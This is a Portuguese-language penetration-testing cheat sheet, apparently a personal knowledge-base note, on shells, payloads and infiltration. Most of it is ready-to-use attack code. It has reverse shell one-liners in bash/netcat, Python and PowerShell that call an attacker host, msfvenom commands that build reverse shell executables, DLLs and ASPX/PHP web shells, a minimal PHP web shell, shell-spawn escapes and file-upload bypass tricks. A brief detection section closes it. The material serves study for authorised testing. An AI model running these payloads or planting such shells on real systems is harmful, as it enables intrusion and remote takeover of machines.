# Shells, Payloads & Infiltration

Conectar e manter acesso ao sistema alvo após explorar uma vulnerabilidade depende da entrega e execução do payload correto.

---

## Conceitos Fundamentais
- **Bind Shell:** O sistema alvo abre uma porta de escuta (listener) e aguarda a conexão direta da máquina atacante. É bloqueado por firewalls de entrada.
- **Reverse Shell:** O sistema alvo inicia uma conexão saint para o IP e porta de escuta do atacante. É ideal para atravessar firewalls de entrada e NAT.
- **Web Shell:** Interface baseada em script HTTP (PHP, ASPX, JSP) hospedada no servidor web da vítima para execução contínua de comandos.

---

## Reverse Shell One-Liners Essenciais

### Bash / Netcat (Linux)
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> <PORT> > /tmp/f
```

### Python (Linux)
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PowerShell (Windows)
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.Encoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## Geração de Payloads com MSFvenom

### Payloads Staged vs Stageless
- **Stageless (Ex: `linux/x64/shell_reverse_tcp`):** O código completo do payload é enviado em uma única transmissão.
- **Staged (Ex: `windows/x64/meterpreter/reverse_tcp`):** Um pequeno código (stager) é enviado primeiro para baixar o restante da carga útil principal na memória.

### Exemplos de Comandos MSFvenom
- **Linux Executable (ELF):**
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f elf > shell.elf
```
- **Windows Executable (EXE):**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe > shell.exe
```
- **Windows DLL:**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f dll > payload.dll
```
- **ASPX Web Shell:**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f aspx > shell.aspx
```
- **PHP Web Shell:**
```bash
msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=4444 -f raw > shell.php
```

---

## Vulnerabilidades Críticas de Infiltração no Windows
- **MS08-067 (CVE-2008-4250):** Estouro de pilha em Server Service (NetAPI32.dll).
- **EternalBlue (MS17-010 / CVE-2017-0144):** Exploração de SMBv1 permitindo RCE como SYSTEM.
- **PrintNightmare (CVE-2021-1675):** Execução remota de código e elevação de privilégios no Spooler de Impressão.
- **BlueKeep (CVE-2019-0708):** RCE em serviços RDP legados.
- **Sigred (CVE-2020-1350):** RCE no servidor DNS do Windows.
- **SeriousSam / HiveNightmare (CVE-2021-36934):** Leitura de arquivos HKLM SAM/SYSTEM por usuários comuns.
- **Zerologon (CVE-2020-1472):** Zera a senha do Domain Controller via protocolo Netlogon.

---

## Infiltração em Linux & Interatividade TTY
Muitas shells iniciais obtidas via web vulnerabilidades são limpas/burras (não possuem suporte a TAB, CTRL+C, ou `clear`).

### Estabilização de Shell TTY em Linux
1. **Spawning TTY com Python:**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
2. **Enviar para Background:** Pressionar `CTRL + Z`.
3. **Ajustar Terminal Local:**
```bash
stty raw -echo; fg
```
4. **Redefinir Variáveis no Alvo:**
```bash
export TERM=xterm-256color
stty rows 38 columns 160
```

### Outros Métodos de Spawn TTY
- **Perl:** `perl -e 'exec "/bin/sh";'`
- **Ruby:** `ruby -e 'exec "/bin/sh"'`
- **Lua:** `lua -e 'os.execute("/bin/sh")'`
- **Awk:** `awk 'BEGIN {system("/bin/sh")}'`
- **Escape de VIM:** `:!/bin/sh` ou `:set shell=/bin/sh`

---

## Web Shells
- **Laudanum:** Coleção de web shells injetáveis para PHP, ASP, ASPX, e JSP.
- **Antak:** Web shell em ASPX do repositório Nishang projetada para execução de comandos PowerShell.
- **PHP Web Shell Minimalista:**
```php
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; system($_REQUEST['cmd']); echo "</pre>"; die; } ?>
```
- **Bypass de Upload de Arquivos via Burp:** Alterar `Content-Type` para `image/png`, usar extensões alternativas (`.phtml`, `.php5`, `.phar`), ou injetar null byte (`shell.php%00.png`).

---

## Detecção & Prevenção
- **MITRE ATT&CK Framework:** Mapeamento de técnicas T1059 (Command and Scripting Interpreter) e T1090 (Proxy/Tunneling).
- **Event Logs de Interesse no Windows:** Event ID 4688 (Process Creation), Event ID 7045 (New Service Installed), Event ID 4104 (PowerShell Script Block Logging).
- **Proteção de Endpoints:** Utilização de EDR (Endpoint Detection and Response), bloqueio de regras ASR (Attack Surface Reduction) e limitação de privilégios de execução de scripts.

---
*Notas relacionadas:* [[File Transfers]], [[Pivoting]], [[Metasploit]], [[Password Attacks]], [[Active Directory]]
